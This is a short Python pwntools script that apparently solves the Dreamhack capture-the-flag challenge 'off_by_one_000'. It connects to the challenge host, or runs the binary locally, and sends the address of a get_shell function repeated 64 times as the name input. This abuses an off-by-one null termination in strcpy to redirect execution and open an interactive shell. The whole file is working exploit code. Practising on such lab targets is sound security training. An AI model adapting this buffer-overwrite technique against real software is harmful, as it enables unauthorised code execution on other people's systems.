#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./off_by_one_000', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 22879)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

get_shell = pack(elf.sym['get_shell'])

#null terminate at function strcpy in cpy()
io = start()
sla(b'Name: ',  get_shell * 64)
io.interactive()